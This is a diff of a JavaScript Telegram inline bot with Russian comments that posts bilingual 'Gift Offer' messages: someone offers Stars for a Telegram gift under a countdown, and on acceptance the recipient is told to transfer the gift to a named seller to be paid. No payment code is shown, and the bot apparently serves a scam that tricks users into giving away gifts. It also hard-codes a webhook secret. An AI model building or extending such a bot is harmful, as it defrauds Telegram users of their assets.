@@ -1,15 +1,16 @@
-const ADMIN_ID = 5151757168; 
+const ADMIN_ID = 5151757168; // Главный админ
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
+// ВСЕ ТВОИ ID (включая основной 5151757168)
 const ALLOWED_IDS = [
-  5151757168, 
-  9021098137, 
-  1290278554, 
-  883619484, 
+  5151757168, // Твой основной ID
+  9021098137,
+  1290278554,
+  883619484,
   7903610791,
   8532075411,
   5766476192,
-  8802398898// Твой новый ID добавлен
+  8802398898
 ];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
@@ -58,11 +59,9 @@ export default {
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
-        // ОПРЕДЕЛЯЕМ ЯЗЫК (если есть "eng" - английский, иначе русский)
         let lang = "ru";
         if (textQuery.includes("eng") || textQuery.includes("en ")) {
             lang = "en";
-            // Убираем "eng" из текста, чтобы он не мешал поиску цифр
             textQuery = textQuery.replace(/eng/g, '').trim();
         }
 
@@ -80,7 +79,6 @@ export default {
             }
         }
 
-        // ОПРЕДЕЛЯЕМ ВАЛЮТУ
         let currencyType = "stars";
         let currencyDisplay = "⭐ Stars";
         
@@ -98,7 +96,6 @@ export default {
 
         const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
         
-        // ГЕНЕРИРУЕМ ТЕКСТ НА ВЫБРАННОМ ЯЗЫКЕ
         let text = "";
         if (lang === "en") {
             text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
@@ -165,9 +162,8 @@ export default {
           const sellerUsername = dataParts[3] || "gwrex"; 
           const giftLink = dataParts[4] || ""; 
           
-          // Определяем язык (по умолчанию ru)
           let lang = "ru";
-          if (dataParts[0] === "acc") {
+          if (action === "acc") {
               lang = dataParts[5] || "ru";
           } else {
               lang = dataParts[3] || "ru";
@@ -191,15 +187,17 @@ export default {
               show_alert: true 
             }, BOT_TOKEN);
             
+            const finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);
+
             if (lang === "en") {
                 newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${sellerUsername}).`;
                 newMarkup = { 
-                  inline_keyboard: [[{ text: "🎁 Send Gift", url: giftLink || ("https://t.me/" + sellerUsername) }]] 
+                  inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] 
                 };
             } else {
                 newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
                 newMarkup = { 
-                  inline_keyboard: [[{ text: "🎁 Передать подарок", url: giftLink || ("https://t.me/" + sellerUsername) }]] 
+                  inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] 
                 };
             }
           } else {
